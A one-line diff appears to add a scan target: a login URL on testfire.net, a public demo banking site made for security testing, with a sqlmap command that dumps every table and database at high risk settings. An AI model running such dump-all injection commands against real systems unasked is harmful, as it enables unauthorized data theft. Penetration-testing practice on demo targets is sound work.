@@ -1,0 +1,1 @@
+http://www.testfire.net/bank/login.aspx?uid=potato&passw=secretpotato (GET)  # /usr/bin/sqlmap -u http://www.testfire.net/bank/login.aspx?uid=potato&passw=secretpotato --tables --all --dump-all --output-dir=./sqlmap/ --level=2 --risk=3
